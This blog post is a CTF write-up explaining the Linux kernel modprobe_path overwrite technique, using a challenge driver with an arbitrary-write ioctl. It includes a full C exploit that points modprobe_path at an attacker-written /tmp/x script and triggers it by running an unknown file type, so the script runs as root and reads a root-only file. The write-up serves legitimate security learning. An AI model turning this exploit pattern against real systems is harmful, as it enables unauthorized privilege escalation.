---
layout: post
title:  "Modprobe overwrite"
date:   2023-01-06
categories: ctf kernelexploit
description: modprobe overwrite - kernel exploitation 
tags: tip-binary ctf
---

# What is modprobe?

modprobe intelligently adds or removes a module from the Linux kernel: note that for convenience, there is no difference between _ and - in module names. modprobe looks in the module directory /lib/modules/'uname -r' for all the modules and other files, except for the optional /etc/modprobe.conf configuration file and /etc/modprobe.d directory (see modprobe.conf(5)). modprobe will also use module options specified on the kernel command line in the form of `<module>.<option>`.
src: https://linux.die.net/man/8/modprobe

modprobe can be use to add or remove loadable kernel module to the linux kernel. modprobe is installed on`/sbin/modprobe` or you can check by yourself `cat /proc/sys/kernel/modprobe`. 

# Modprobe overwrite

Since the path of modprobe is stored under the symbol `modprobe_path` in the kernel and in a writeable page, we can get the address by reading `/proc/kallsyms`, after that we can overwrite the address of `modprobe_path` with malicious path which pointed to other file in this case `evil.sh`. Then `evil.sh` will be executed when we execute unkown file type on the system. 

# Exploitation

in this post I will use a CTF challenge from Cyber Jawar Final 2022 called `Nakiri Ayame`, since the challenge require a kernel leak and this can be achieved by leaking the kernel via stacktrace or bruteforce the address I disabled the kaslr to make it easier :v (tawa penuh ke noob-an). Since we have arbitrary address write (AAW) primitive and address of the modprobe_path symbol, We can overwrite `modprobe_path` to malicious shellscript/binary so the binary/shellscript will executed as root

the kernel module will be installed at "/dev/ayame". we can interact with the kernel module with `ioctl()` and value `0x1337`.

<img src="/images/finalcj2022/1.png">

Our goal is to read the flag at `/root/flag` to do that we need to escalate from user to root. Firstly we can open the vuln kernel module 

{% highlight C %}
char *VULN_DRV = "/dev/ayame";

void open_dev_vuln(void){
    fd = open(VULN_DRV, O_RDWR);
    if(fd < 0){
        write(1,"[-] fail to open device\n",24);
    }else{
        write(1,"[+] device opened\n",18);
    }
}
{% endhighlight %}

then we need to get the address of `modprobe_path` symbol, we can use command `cat /proc/kallsyms | grep modprobe_path` to read the address since I disabled the kaslr protection :v 

    ffffffff82445b60 D modprobe_path

Now we can reverse `/tmp/x` and encoded the string as hex, this string will overwrite the modprobe_path value from `/sbin/modprobe` to `/tmp/x`. We overwrite the modprobe_path using arbitrary address write (AAW) primitive to our evil string. 

{% highlight C %}
void overwrite_modprobe(void){

    // ffffffff82445b60 D modprobe_path
    unsigned long modprobe_path = 0xffffffff82445b60;
    unsigned long evil_modprobe_path = 0x782f706d742f;


    buf2[0] = modprobe_path; // rdi
    buf2[1] = &evil_modprobe_path; // rsi
    buf2[2] = 0x50; // rdx

    ioctl(fd, 0x1337, &buf2);
}
{% endhighlight %}

Then we can trigger the bug so kernel will execute our `modprobe_path` with root user. This can be achived by create a shellscritpt/binary at `/tmp/x` since our goal to read `/root/flag` we can create a shellscript to copy the flag to /tmp and make it readable. Then we create unknown file type signature so the system will invoke `modprobe`.

{% highlight C %}
void trigger_modprobe(void){
    write(1,"[*] Returned to userland, setting up for fake modprobe\n", 56);
    
    system("echo '#!/bin/sh\ncp /root/flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[+] Run unknown file");
    system("/tmp/dummy");

    puts("[+] readflag ");
    system("cat /tmp/flag");

    exit(0);
}
{% endhighlight %}
 

Full exploit:

{% highlight C %}
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

int64_t buf[0x400];
int64_t buf2[0x400];
int fd;

char *VULN_DRV = "/dev/ayame";

void open_dev_vuln(void){
    fd = open(VULN_DRV, O_RDWR);
    if(fd < 0){
        write(1,"[-] fail to open device\n",24);
    }else{
        write(1,"[+] device opened\n",18);
    }
}

// ffffc90000147ec0
void get_crash(void){
    // int64_t buf[0x400];
    buf2[0] = 0xdeadbeef;
    buf2[1] = &buf;
    buf2[2] = 0x41414141;
    
    for (int i = 0; i < 0x80; ++i){
        buf[i] = 0x4242424242424242;
    }

    ioctl(fd, 0x1337, &buf);
    // return 0;
}

void overwrite_modprobe(void){

    // ffffffff82445b60 D modprobe_path
    unsigned long modprobe_path = 0xffffffff82445b60;
    unsigned long evil_modprobe_path = 0x782f706d742f;


    buf2[0] = modprobe_path; // rdi
    buf2[1] = &evil_modprobe_path; // rsi
    buf2[2] = 0x50; // rdx

    ioctl(fd, 0x1337, &buf2);
}

void trigger_modprobe(void){
    write(1,"[*] Returned to userland, setting up for fake modprobe\n", 56);
    
    system("echo '#!/bin/sh\ncp /root/flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[+] Run unknown file");
    system("/tmp/dummy");

    puts("[+] readflag ");
    system("cat /tmp/flag");

    exit(0);
}


void main(void){
    open_dev_vuln();
    overwrite_modprobe();
    trigger_modprobe();
}

{% endhighlight %}


run the exploit and we get our `/root/flag` flag

<img src="/images/finalcj2022/2.png"/>

I don't cover how to send our exploit to the server since the challenge server already died. You can learn more how to send the exploit from <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">here</a> kudos to the challenge author.

other useful resource:
<ul>
    <li>
        <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/"> lkmidas </a>
    </li>
    <li>
        <a href="https://sam4k.com/like-techniques-modprobe_path/"> sam4k </a>
    </li>
</ul>